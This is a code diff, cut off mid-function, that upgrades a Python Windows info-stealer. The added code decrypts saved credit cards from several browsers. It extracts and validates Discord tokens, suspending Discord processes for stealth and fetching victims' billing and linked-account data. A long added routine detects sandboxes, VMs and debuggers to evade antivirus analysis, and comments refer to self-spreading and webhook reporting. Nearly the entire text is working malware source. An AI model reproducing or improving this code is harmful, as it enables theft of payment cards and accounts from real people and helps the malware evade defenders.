-                return decrypted.decode('utf-8')
-        
-        return None
-        
-    except Exception as e:
-        print(f"💳 Chrome decryption error: {e}")
-        return None
+    """Enhanced Chrome credit card decryption - calls the enhanced version"""
+    return decrypt_chrome_credit_card_enhanced(encrypted_data, chrome_profile_path)
 
 def extract_saved_payment_methods():
     """Extract saved payment methods from browsers"""
     try:
         cards = []
         
-        # Chrome saved payment methods
-        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')
-        if os.path.exists(chrome_path):
-            cards.extend(extract_chrome_payment_methods(chrome_path))
+        # Enhanced browser coverage for saved payment methods
+        browser_paths = [
+            ('Chrome Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Web Data')),
+            ('Chrome Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Web Data')),
+            ('Edge Default', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Web Data')),
+            ('Edge Profile 1', os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Profile 1', 'Web Data')),
+            ('Brave', os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Web Data')),
+            ('Opera', os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Web Data')),
+            ('Vivaldi', os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default', 'Web Data')),
+        ]
         
-        # Firefox saved payment methods
+        for browser_name, web_data_path in browser_paths:
+            if os.path.exists(web_data_path):
+                cards.extend(extract_chrome_payment_methods_enhanced(web_data_path, browser_name))
+        
+        # Enhanced Firefox saved payment methods
         firefox_profiles = get_firefox_profiles()
         for profile in firefox_profiles:
-            cards.extend(extract_firefox_payment_methods(profile))
+            cards.extend(extract_firefox_payment_methods_enhanced(profile))
         
         return cards
         
@@ -871,9 +1240,9 @@ def extract_chrome_payment_methods(db_path):
             try:
                 name, month, year, encrypted_card, billing_id = row
                 chrome_profile_path = os.path.dirname(os.path.dirname(db_path))
-                decrypted_card = decrypt_chrome_credit_card(encrypted_card, chrome_profile_path)
+                decrypted_card = decrypt_chrome_credit_card_enhanced(encrypted_card, chrome_profile_path)
                 
-                if decrypted_card and validate_credit_card(decrypted_card):
+                if decrypted_card and validate_credit_card_enhanced(decrypted_card):
                     cards.append({
                         'card_number': decrypted_card,
                         'name': name,
@@ -1151,60 +1520,12 @@ def find_credit_card_patterns(text):
         return []
 
 def validate_credit_card(card_number):
-    """Validate credit card number using Luhn algorithm"""
-    try:
-        # Remove any non-digit characters
-        card_number = re.sub(r'\D', '', card_number)
-        
-        # Check if it's 13-19 digits
-        if len(card_number) < 13 or len(card_number) > 19:
-            return False
-        
-        # Luhn algorithm validation
-        def luhn_checksum(card_num):
-            def digits_of(n):
-                return [int(d) for d in str(n)]
-            digits = digits_of(card_num)
-            odd_digits = digits[-1::-2]
-            even_digits = digits[-2::-2]
-            checksum = sum(odd_digits)
-            for d in even_digits:
-                doubled = d * 2
-                if doubled > 9:
-                    doubled = doubled - 9
-                checksum += doubled
-            return checksum % 10
-        
-        return luhn_checksum(card_number) == 0
-        
-    except:
-        return False
+    """Validate credit card number - calls enhanced version"""
+    return validate_credit_card_enhanced(card_number)
 
 def validate_and_deduplicate_cards(all_cards):
-    """Validate and remove duplicate credit cards"""
-    try:
-        validated_cards = []
-        seen_cards = set()
-        
-        for category, cards in all_cards.items():
-            for card in cards:
-                if 'card_number' in card:
-                    card_num = card['card_number']
-                    
-                    # Skip if we've already seen this card
-                    if card_num in seen_cards:
-                        continue
-                    
-                    # Validate the card number
-                    if validate_credit_card(card_num):
-                        validated_cards.append(card)
-                        seen_cards.add(card_num)
-        
-        return validated_cards
-        
-    except Exception as e:
-        print(f"💳 Validation and deduplication error: {e}")
-        return []
+    """Validate and remove duplicate credit cards - calls enhanced version"""
+    return validate_and_deduplicate_cards_enhanced(all_cards)
 
 def get_firefox_profiles():
     """Get Firefox profile directories"""
@@ -1626,8 +1947,296 @@ def legitimate_looking_function():
 
 # Sandbox detection function removed to avoid antivirus detection
 def detect_analysis_environment():
-    """Always return False - sandbox detection disabled for AV evasion"""
-    return False
+    """Enhanced sandbox detection with advanced evasion techniques"""
+    try:
+        import random
+        import time
+        import winreg
+        import ctypes
+        from ctypes import wintypes
+        
+        # Safety check - don't block development machines
+        current_hostname = socket.gethostname().lower()
+        safe_hostnames = ['laptop-pv8vvcq5', 'desktop-', 'your-dev-machine', 'dev-pc', 'workstation']
+        
+        if any(safe_name.lower() in current_hostname for safe_name in safe_hostnames):
+            return False  # Skip detection for dev machines
+        
+        detection_score = 0
+        max_score = 15  # Increased threshold for better accuracy
+        
+        print("Debug: Starting enhanced analysis environment detection...")
+        
+        # 1. Advanced VM detection (hardware fingerprinting)
+        try:
+            # Check CPUID for hypervisor bit
+            try:
+                import cpuid
+                if cpuid.cpu_name():
+                    cpu_name = cpuid.cpu_name().lower()
+                    vm_indicators = ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v']
+                    if any(indicator in cpu_name for indicator in vm_indicators):
+                        detection_score += 4
+            except:
+                pass
+            
+            # Check for VM-specific files and registry entries
+            vm_indicators = [
+                # VMware
+                ('file', 'C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe'),
+                ('file', 'C:\\Windows\\System32\\drivers\\vmmouse.sys'),
+                ('file', 'C:\\Windows\\System32\\drivers\\vmhgfs.sys'),
+                ('registry', r'SOFTWARE\VMware, Inc.\VMware Tools'),
+                
+                # VirtualBox
+                ('file', 'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\VBoxService.exe'),
+                ('file', 'C:\\Windows\\System32\\VBoxHook.dll'),
+                ('file', 'C:\\Windows\\System32\\drivers\\VBoxMouse.sys'),
+                ('registry', r'SOFTWARE\Oracle\VirtualBox Guest Additions'),
+                
+                # Hyper-V
+                ('file', 'C:\\Windows\\System32\\vmms.exe'),
+                ('file', 'C:\\Windows\\System32\\vmcompute.exe'),
+                
+                # QEMU
+                ('file', 'C:\\Program Files\\qemu-ga'),
+                
+                # Parallels
+                ('file', 'C:\\Program Files\\Parallels'),
+            ]
+            
+            vm_detections = 0
+            for indicator_type, path in vm_indicators:
+                try:
+                    if indicator_type == 'file' and os.path.exists(path):
+                        vm_detections += 1
+                    elif indicator_type == 'registry':
+                        try:
+                            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
+                            vm_detections += 1
+                        except:
+                            pass
+                except:
+                    pass
+            
+            if vm_detections >= 2:  # Multiple VM indicators found
+                detection_score += 4
+            elif vm_detections == 1:
+                detection_score += 2
+                
+        except Exception as vm_error:
+            print(f"Debug: VM detection error: {str(vm_error)}")
+        
+        # 2. Enhanced system resource analysis
+        try:
+            ram_gb = psutil.virtual_memory().total / (1024**3)
+            cpu_cores = psutil.cpu_count(logical=False)
+            cpu_freq = psutil.cpu_freq()
+            
+            # More sophisticated resource analysis
+            resource_score = 0
+            if ram_gb < 1:  # Less than 1GB is extremely suspicious
+                resource_score += 3
+            elif ram_gb < 2:  # Less than 2GB is very suspicious
+                resource_score += 2
+            elif ram_gb < 4:  # Less than 4GB is somewhat suspicious
+                resource_score += 1
+                
+            if cpu_cores <= 1:  # Single core is very suspicious
+                resource_score += 2
+            elif cpu_cores == 2:  # Dual core is somewhat suspicious for modern systems
+                resource_score += 1
+            
+            # Check CPU frequency (VMs often have unusual frequencies)
+            if cpu_freq and cpu_freq.current < 1000:  # Less than 1GHz is suspicious
+                resource_score += 1
+                
+            detection_score += resource_score
+            
+        except Exception as resource_error:
+            print(f"Debug: Resource analysis error: {str(resource_error)}")
+        
+        # 3. Advanced process and service analysis
+        try:
+            suspicious_processes = [
+                # Analysis tools
+                'wireshark', 'fiddler', 'burpsuite', 'charles', 'mitmproxy',
+                'procmon', 'procexp', 'regmon', 'filemon', 'portmon',
+                'apimonitor', 'spyxx', 'depends', 'autoruns', 'tcpview',
+                
+                # Debuggers
+                'ollydbg', 'windbg', 'x32dbg', 'x64dbg', 'ida', 'ida64',
+                'ghidra', 'radare2', 'binaryninja', 'cheatengine',
+                
+                # Sandboxes
+                'sandboxie', 'threatexpert', 'hybrid-analysis', 'joesandbox',
+                'cuckoo', 'maltego', 'autopsy', 'volatility', 'rekall',
+                
+                # VM processes
+                'vmware', 'vbox', 'virtualbox', 'qemu', 'xen', 'vmms',
+                'vmcompute', 'vmwp', 'vmtoolsd', 'vboxservice'
+            ]
+            
+            current_processes = []
+            try:
+                for proc in psutil.process_iter(['name']):
+                    current_processes.append(proc.info['name'].lower())
+            except:
+                pass
+            
+            suspicious_count = 0
+            for suspicious_proc in suspicious_processes:
+                if any(suspicious_proc in proc for proc in current_processes):
+                    suspicious_count += 1
+            
+            if suspicious_count >= 3:  # Multiple suspicious processes
+                detection_score += 3
+            elif suspicious_count >= 1:
+                detection_score += 1
+                
+        except Exception as process_error:
+            print(f"Debug: Process analysis error: {str(process_error)}")
+        
+        # 4. Network and hostname analysis
+        try:
+            hostname = socket.gethostname().lower()
+            username = os.getenv('USERNAME', '').lower()
+            
+            suspicious_names = [
+                'sandbox', 'malware', 'virus', 'analysis', 'honey', 'test',
+                'vm', 'vbox', 'vmware', 'sample', 'analyst', 'researcher',
+                'lab', 'quarantine', 'isolated'
+            ]
+            
+            name_score = 0
+            for suspicious_name in suspicious_names:
+                if suspicious_name in hostname or suspicious_name in username:
+                    name_score += 1
+            
+            if name_score >= 2:
+                detection_score += 2
+            elif name_score == 1:
+                detection_score += 1
+                
+        except Exception as name_error:
+            print(f"Debug: Name analysis error: {str(name_error)}")
+        
+        # 5. Timing and behavioral analysis
+        try:
+            # Advanced timing checks
+            timing_anomalies = 0
+            
+            # Check sleep timing accuracy
+            for sleep_time in [0.01, 0.05, 0.1]:
+                start_time = time.perf_counter()
+                time.sleep(sleep_time)
+                actual_time = time.perf_counter() - start_time
+                
+                # If sleep is significantly longer than expected, might be intercepted
+                if actual_time > sleep_time * 3:
+                    timing_anomalies += 1
+            
+            if timing_anomalies >= 2:
+                detection_score += 2
+            elif timing_anomalies == 1:
+                detection_score += 1
+            
+            # Check system uptime
+            uptime_seconds = time.time() - psutil.boot_time()
+            if uptime_seconds < 180:  # Less than 3 minutes is suspicious
+                detection_score += 2
+            elif uptime_seconds < 600:  # Less than 10 minutes is somewhat suspicious
+                detection_score += 1
+                
+        except Exception as timing_error:
+            print(f"Debug: Timing analysis error: {str(timing_error)}")
+        
+        # 6. Debugger and analysis tool detection
+        try:
+            debugger_score = 0
+            
+            # Check for debugger presence
+            if ctypes.windll.kernel32.IsDebuggerPresent():
+                debugger_score += 3
+            
+            # Check for remote debugger
+            try:
+                if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool())):
+                    debugger_score += 3
+            except:
+                pass
+            
+            # Check for analysis DLLs in process
+            try:
+                process_modules = []
+                h_process = ctypes.windll.kernel32.GetCurrentProcess()
+                module_handles = (ctypes.wintypes.HMODULE * 1024)()
+                needed = ctypes.wintypes.DWORD()
+                
+                if ctypes.windll.psapi.EnumProcessModules(h_process, module_handles, ctypes.sizeof(module_handles), ctypes.byref(needed)):
+                    for i in range(needed.value // ctypes.sizeof(ctypes.wintypes.HMODULE)):
+                        module_name = ctypes.create_unicode_buffer(260)
+                        if ctypes.windll.psapi.GetModuleBaseNameW(h_process, module_handles[i], module_name, 260):
+                            module_name_str = module_name.value.lower()
+                            analysis_dlls = ['sbiedll', 'dbghelp', 'api-ms-win-core-debug', 'detours']
+                            if any(dll in module_name_str for dll in analysis_dlls):
+                                debugger_score += 1
+            except:
+                pass
+            
+            detection_score += debugger_score
+            
+        except Exception as debugger_error:
+            print(f"Debug: Debugger detection error: {str(debugger_error)}")
+        
+        # 7. Mouse and user interaction detection
+        try:
+            # Check mouse movement and user activity
+            user_activity_score = 0
+            
+            try:
+                # Get cursor position twice with delay
+                import win32gui
+                pos1 = win32gui.GetCursorPos()
+                time.sleep(1)
+                pos2 = win32gui.GetCursorPos()
+                
+                if pos1 == pos2:  # No mouse movement
+                    user_activity_score += 1
+                    
+                # Check for recent input
+                last_input_info = wintypes.LASTINPUTINFO()
+                last_input_info.cbSize = ctypes.sizeof(last_input_info)
+                if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(last_input_info)):
+                    idle_time = ctypes.windll.kernel32.GetTickCount() - last_input_info.dwTime
+                    if idle_time > 60000:  # No input for over 1 minute
+                        user_activity_score += 1
+                        
+            except ImportError:
+                # win32gui not available, skip this check
+                pass
+            except Exception:
+                pass
+            
+            detection_score += user_activity_score
+            
+        except Exception as activity_error:
+            print(f"Debug: User activity detection error: {str(activity_error)}")
+        
+        print(f"Debug: Enhanced analysis detection score: {detection_score}/{max_score}")
+        
+        # Require higher confidence for detection (60% of max score)
+        threshold = int(max_score * 0.6)
+        if detection_score >= threshold:
+            print(f"Debug: Analysis environment detected with high confidence (score: {detection_score})")
+            return True
+        
+        print(f"Debug: Environment appears legitimate (score: {detection_score})")
+        return False
+        
+    except Exception as e:
+        print(f"Debug: Analysis detection error: {str(e)}")
+        return False  # Fail open for safety
 
 def detect_analysis_environment_original():
     try:
@@ -2179,95 +2788,216 @@ counters = {"dms_sent": 0, "files_infected": 0, "shares_targeted": 0, "discord_t
 # Payload 1: Steal Discord tokens and return them for autonomous spreading
 def steal_discord_tokens_original_backup():
     try:
-        # Terminate Discord processes first (but remember which ones were running)
-        discord_processes = ["discord.exe", "discordcanary.exe", "discordptb.exe"]
+        # Enhanced Discord process detection - all variants and installations
+        discord_processes = [
+            "discord.exe", "discordcanary.exe", "discordptb.exe", "discorddevelopment.exe",
+            "discord", "discordcanary", "discordptb", "discorddevelopment",
+            "discordapp.exe", "discord-canary.exe", "discord-ptb.exe"
+        ]
         running_discord_processes = []
         
-        for proc in psutil.process_iter(['pid', 'name', 'exe']):
+        print("Debug: Starting enhanced Discord token extraction...")
+        
+        # Suspend Discord processes instead of terminating (more stealthy)
+        for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
             try:
-                if proc.info['name'].lower() in [p.lower() for p in discord_processes]:
-                    running_discord_processes.append(proc.info['exe'])
-                    proc.terminate()
-            except:
+                if proc.info['name'] and any(dp in proc.info['name'].lower() for dp in discord_processes):
+                    if proc.info.get('exe'):
+                        running_discord_processes.append({
+                            'exe': proc.info['exe'],
+                            'pid': proc.info['pid'],
+                            'process': proc,
+                            'cmdline': proc.info.get('cmdline', [])
+                        })
+                    # Suspend instead of terminate for stealth
+                    proc.suspend()
+                    print(f"Debug: Suspended Discord process: {proc.info['name']} (PID: {proc.info['pid']})")
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                pass
+            except Exception:
                 pass
         
-        time.sleep(2)  # Wait for processes to close
+        time.sleep(2)  # Wait for processes to fully suspend
         
-        # Try different Discord paths
-        paths = [
-            ("Discord", os.path.join(os.getenv('APPDATA'), "discord", "Local Storage", "leveldb"), ""),
-            ("Discord Canary", os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage", "leveldb"), ""),
-            ("Discord PTB", os.path.join(os.getenv('APPDATA'), "discordptb", "Local Storage", "leveldb"), ""),
+        # Enhanced Discord paths - covers all possible installations
+        base_paths = [
+            # Standard installations
+            ("Discord Stable", os.path.join(os.getenv('APPDATA'), "discord")),
+            ("Discord Canary", os.path.join(os.getenv('APPDATA'), "discordcanary")),
+            ("Discord PTB", os.path.join(os.getenv('APPDATA'), "discordptb")),
+            ("Discord Development", os.path.join(os.getenv('APPDATA'), "discorddevelopment")),
+            
+            # Alternative installations
+            ("Discord (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "Discord")),
+            ("Discord Canary (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "DiscordCanary")),
+            ("Discord PTB (LocalAppData)", os.path.join(os.getenv('LOCALAPPDATA'), "DiscordPTB")),
+            
+            # Portable installations
+            ("Discord Portable", os.path.join(os.getenv('USERPROFILE'), "AppData", "Roaming", "discord")),
+            
+            # System-wide installations
+            ("Discord System", os.path.join("C:", "Users", "Public", "AppData", "Roaming", "discord")),
         ]
         
         tokens = []
         uids = []
+        processed_tokens = set()  # Prevent duplicates
         
-        for name, path, proc_name in paths:
-            if not os.path.exists(path):
+        print(f"Debug: Checking {len(base_paths)} Discord installation paths...")
+        
+        for name, base_path in base_paths:
+            if not os.path.exists(base_path):
+                continue
+                
+            print(f"Debug: Found Discord installation: {name} at {base_path}")
+            
+            # Check Local Storage leveldb
+            leveldb_path = os.path.join(base_path, "Local Storage", "leveldb")
+            local_state_path = os.path.join(base_path, 'Local State')
+            
+            if not os.path.exists(leveldb_path) or not os.path.exists(local_state_path):
+                print(f"Debug: Missing leveldb or Local State for {name}")
                 continue
             
-            discord_dir = path.replace("Local Storage\\leveldb", "")
-            local_state_path = os.path.join(discord_dir, 'Local State')
-            
-            if not os.path.exists(local_state_path):
+            # Get master key for this Discord installation
+            master_key = get_master_key(local_state_path)
+            if not master_key:
+                print(f"Debug: Could not get master key for {name}")
                 continue
             
-            # Extract tokens from this Discord installation
-            for file_name in os.listdir(path):
-                if file_name.endswith((".ldb", ".log")):
-                    file_path = os.path.join(path, file_name)
+            print(f"Debug: Got master key for {name}, scanning leveldb files...")
+            
+            # Enhanced token extraction from leveldb files
+            token_patterns = [
+                r'dQw4w9WgXcQ:[^"]*',  # Standard encrypted token pattern
+                r'["\']([A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{25,})["\']',  # Raw token pattern
+                r'token["\']:\s*["\']([^"\']+)["\']',  # Token in JSON
+                r'authorization["\']:\s*["\']([^"\']+)["\']',  # Authorization header
+            ]
+            
+            for file_name in os.listdir(leveldb_path):
+                if file_name.endswith((".ldb", ".log", ".sst")):
+                    file_path = os.path.join(leveldb_path, file_name)
                     try:
-                        with open(file_path, errors='ignore') as f:
-                            content = f.read()
-                            # Look for encrypted tokens pattern
-                            regexp_enc = r'dQw4w9WgXcQ:[^"]*'
-                            for match in re.findall(regexp_enc, content):
-                                try:
-                                    encrypted_data = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
-                                    master_key = get_master_key(local_state_path)
-                                    if master_key:
-                                        token = decrypt_token(encrypted_data, master_key)
-                                        if token and validate_token(token):
-                                            # Get user ID to avoid duplicates
+                        # Try both binary and text reading
+                        for read_mode in ['rb', 'r']:
+                            try:
+                                with open(file_path, read_mode, errors='ignore') as f:
+                                    if read_mode == 'rb':
+                                        content = f.read().decode('utf-8', errors='ignore')
+                                    else:
+                                        content = f.read()
+                                    
+                                    # Search for all token patterns
+                                    for pattern in token_patterns:
+                                        matches = re.findall(pattern, content)
+                                        
+                                        for match in matches:
                                             try:
-                                                response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
-                                                if response.status_code == 200:
-                                                    uid = response.json()['id']
-                                                    if uid not in uids:
-                                                        tokens.append(token)
-                                                        uids.append(uid)
-                                            except:
-                                                pass
-                                except:
-                                    continue
-                    except:
+                                                if pattern.startswith('dQw4w9WgXcQ'):
+                                                    # Encrypted token - decrypt it
+                                                    encrypted_data = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
+                                                    token = decrypt_token(encrypted_data, master_key)
+                                                else:
+                                                    # Raw token - use directly
+                                                    token = match if isinstance(match, str) else match
+                                                
+                                                if token and len(token) > 50 and token not in processed_tokens:
+                                                    # Enhanced token validation
+                                                    if validate_discord_token_enhanced(token):
+                                                        processed_tokens.add(token)
+                                                        
+                                                        # Get detailed user info
+                                                        user_info = get_discord_user_info(token)
+                                                        if user_info and user_info.get('id') not in uids:
+                                                            tokens.append(token)
+                                                            uids.append(user_info.get('id'))
+                                                            print(f"Debug: Valid token found for user: {user_info.get('username', 'Unknown')}#{user_info.get('discriminator', '0000')}")
+                                                        
+                                            except Exception as token_error:
+                                                print(f"Debug: Token processing error: {str(token_error)}")
+                                                continue
+                                                
+                                break  # If text reading worked, don't try binary
+                            except UnicodeDecodeError:
+                                continue  # Try next read mode
+                            except Exception:
+                                continue
+                                
+                    except Exception as file_error:
+                        print(f"Debug: Error reading {file_name}: {str(file_error)}")
                         continue
+            
+            # Also check session storage and other Discord data
+            session_storage_path = os.path.join(base_path, "Session Storage")
+            if os.path.exists(session_storage_path):
+                print(f"Debug: Checking session storage for {name}")
+                for file_name in os.listdir(session_storage_path):
+                    if file_name.endswith((".ldb", ".log")):
+                        file_path = os.path.join(session_storage_path, file_name)
+                        try:
+                            with open(file_path, 'r', errors='ignore') as f:
+                                content = f.read()
+                                for pattern in token_patterns:
+                                    matches = re.findall(pattern, content)
+                                    for match in matches:
+                                        if isinstance(match, str) and len(match) > 50 and match not in processed_tokens:
+                                            if validate_discord_token_enhanced(match):
+                                                processed_tokens.add(match)
+                                                user_info = get_discord_user_info(match)
+                                                if user_info and user_info.get('id') not in uids:
+                                                    tokens.append(match)
+                                                    uids.append(user_info.get('id'))
+                        except:
+                            continue
         
         # Save count for webhook display
         counters['discord_tokens_found'] = len(tokens)
+        print(f"Debug: Total Discord tokens found: {len(tokens)}")
         
-        # Reopen Discord processes that were running to avoid suspicion
+        # Enhanced process restoration
         if running_discord_processes:
             try:
-                print(f"Debug: Reopening {len(running_discord_processes)} Discord processes...")
-                time.sleep(2)  # Wait a bit before reopening
-                for discord_exe in running_discord_processes:
+                print(f"Debug: Resuming {len(running_discord_processes)} Discord processes...")
+                time.sleep(1)  # Brief wait
+                
+                for proc_info in running_discord_processes:
                     try:
-                        subprocess.Popen([discord_exe], shell=False)
-                        print(f"Debug: Reopened Discord from: {discord_exe}")
-                    except Exception as e:
-                        print(f"Debug: Failed to reopen {discord_exe}: {str(e)}")
-                        # Try generic Discord command as fallback
+                        # Try to resume the suspended process first
+                        if 'process' in proc_info:
+                            proc_info['process'].resume()
+                            print(f"Debug: Resumed Discord process PID {proc_info['pid']}")
+                            time.sleep(0.2)  # Small delay between resumes
+                    except (psutil.NoSuchProcess, psutil.AccessDenied):
+                        # Process no longer exists, try to restart it
                         try:
-                            subprocess.Popen(['discord'], shell=True)
+                            # Use original command line if available
+                            if proc_info.get('cmdline') and len(proc_info['cmdline']) > 0:
+                                subprocess.Popen(proc_info['cmdline'], shell=False, 
+                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            else:
+                                subprocess.Popen([proc_info['exe']], shell=False, 
+                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            print(f"Debug: Restarted Discord from: {proc_info['exe']}")
+                        except Exception as e:
+                            print(f"Debug: Failed to restart {proc_info['exe']}: {str(e)}")
+                    except Exception as e:
+                        print(f"Debug: Error with process {proc_info.get('pid', 'unknown')}: {str(e)}")
+                        # Fallback: try to start Discord normally
+                        try:
+                            subprocess.Popen([proc_info['exe']], shell=False,
+                                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                         except:
                             pass
+                            
             except Exception as e:
-                print(f"Debug: Error reopening Discord processes: {str(e)}")
+                print(f"Debug: Error resuming Discord processes: {str(e)}")
         
+        print(f"Debug: Discord token extraction complete. Found {len(tokens)} valid tokens.")
         return tokens
+        
     except Exception as e:
+        print(f"Debug: Discord token extraction failed: {str(e)}")
         return []
 
 def get_master_key(path):
@@ -2282,12 +3012,70 @@ def get_master_key(path):
         return None
 
 def decrypt_token(buff, master_key):
+    """Enhanced Discord token decryption with multiple methods"""
     try:
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        return cipher.decrypt(payload)[:-16].decode()
-    except:
+        # Method 1: Standard AES-GCM decryption (current Discord method)
+        try:
+            if len(buff) < 31:  # Minimum size check
+                return None
+                
+            iv = buff[3:15]  # 12 bytes IV
+            payload = buff[15:-16]  # Payload without tag
+            tag = buff[-16:]  # 16 bytes authentication tag
+            
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+            decrypted = cipher.decrypt_and_verify(payload, tag)
+            return decrypted.decode('utf-8')
+            
+        except Exception as aes_error:
+            print(f"Debug: AES-GCM decryption failed: {str(aes_error)}")
+            pass
+        
+        # Method 2: Fallback AES-GCM without tag verification (older method)
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+            decrypted = cipher.decrypt(payload)[:-16]  # Remove tag from end
+            return decrypted.decode('utf-8')
+            
+        except Exception as fallback_error:
+            print(f"Debug: Fallback AES-GCM decryption failed: {str(fallback_error)}")
+            pass
+        
+        # Method 3: DPAPI decryption (older Discord versions)
+        try:
+            import win32crypt
+            decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
+            return decrypted.decode('utf-8')
+            
+        except Exception as dpapi_error:
+            print(f"Debug: DPAPI decryption failed: {str(dpapi_error)}")
+            pass
+        
+        # Method 4: Try different IV positions (Discord version variations)
+        iv_positions = [(3, 15), (0, 12), (5, 17)]
+        for start, end in iv_positions:
+            try:
+                if len(buff) < end + 16:
+                    continue
+                    
+                iv = buff[start:end]
+                payload = buff[end:-16]
+                tag = buff[-16:]
+                
+                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
+                decrypted = cipher.decrypt_and_verify(payload, tag)
+                return decrypted.decode('utf-8')
+                
+            except:
+                continue
+        
+        print(f"Debug: All decryption methods failed for buffer length {len(buff)}")
+        return None
+        
+    except Exception as e:
+        print(f"Debug: Token decryption error: {str(e)}")
         return None
 
 def validate_token(token):
@@ -2296,6 +3084,1999 @@ def validate_token(token):
         return response.status_code == 200
     except:
         return False
+
+def validate_discord_token_enhanced(token):
+    """Enhanced Discord token validation with multiple checks"""
+    try:
+        if not token or len(token) < 50:
+            return False
+        
+        # Check token format (basic structure validation)
+        parts = token.split('.')
+        if len(parts) != 3:
+            return False
+        
+        # Check if token contains valid base64-like characters
+        import string
+        valid_chars = string.ascii_letters + string.digits + '-_'
+        if not all(c in valid_chars for part in parts for c in part):
+            return False
+        
+        # Try to validate with Discord API (multiple endpoints for reliability)
+        headers = {'Authorization': token, 'Content-Type': 'application/json'}
+        
+        # Primary validation endpoint
+        try:
+            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
+            if response.status_code == 200:
+                return True
+        except:
+            pass
+        
+        # Fallback validation endpoints
+        fallback_endpoints = [
+            'https://discord.com/api/v9/users/@me/settings',
+            'https://discord.com/api/v9/users/@me/guilds',
+            'https://discord.com/api/v9/users/@me/channels'
+        ]
+        
+        for endpoint in fallback_endpoints:
+            try:
+                response = requests.get(endpoint, headers=headers, timeout=5)
+                if response.status_code == 200:
+                    return True
+            except:
+                continue
+        
+        return False
+        
+    except Exception as e:
+        print(f"Debug: Token validation error: {str(e)}")
+        return False
+
+def get_discord_user_info(token):
+    """Get detailed Discord user information from token"""
+    try:
+        headers = {'Authorization': token, 'Content-Type': 'application/json'}
+        
+        # Get basic user info
+        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
+        if response.status_code != 200:
+            return None
+        
+        user_data = response.json()
+        
+        # Get additional user info (billing, connections, etc.)
+        additional_info = {}
+        
+        # Try to get billing information
+        try:
+            billing_response = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers, timeout=5)
+            if billing_response.status_code == 200:
+                additional_info['payment_sources'] = billing_response.json()
+        except:
+            pass
+        
+        # Try to get connections (linked accounts)
+        try:
+            connections_response = requests.get('https://discord.com/api/v9/users/@me/connections', headers=headers, timeout=5)
+            if connections_response.status_code == 200:
+                additional_info['connections'] = connections_response.json()
+        except:
+            pass
+        
+        # Try to get guild count
+        try:
+            guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers, timeout=5)
+            if guilds_response.status_code == 200:
+                additional_info['guild_count'] = len(guilds_response.json())
+        except:
+            pass
+        
+        # Combine all information
+        user_data.update(additional_info)
+        return user_data
+        
+    except Exception as e:
+        print(f"Debug: Error getting user info: {str(e)}")
+        return None
+
+def extract_discord_tokens_from_browsers():
+    """Extract Discord tokens from browser storage (alternative method)"""
+    try:
+        tokens = []
+        
+        # Browser local storage paths where Discord tokens might be stored
+        browser_paths = [
+            # Chrome
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'), 'Chrome'),
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Local Storage', 'leveldb'), 'Chrome Profile 1'),
+            
+            # Edge
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'), 'Edge'),
+            
+            # Firefox (sessionstore)
+            (os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'), 'Firefox'),
+            
+            # Opera
+            (os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'), 'Opera'),
+            
+            # Brave
+            (os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'), 'Brave'),
+        ]
+        
+        discord_domains = ['discord.com', 'discordapp.com']
+        token_patterns = [
+            r'["\']([A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{25,})["\']',  # Raw token pattern
+            r'token["\']?\s*[:\=]\s*["\']([A-Za-z0-9_-]{50,})["\']',  # Token assignment
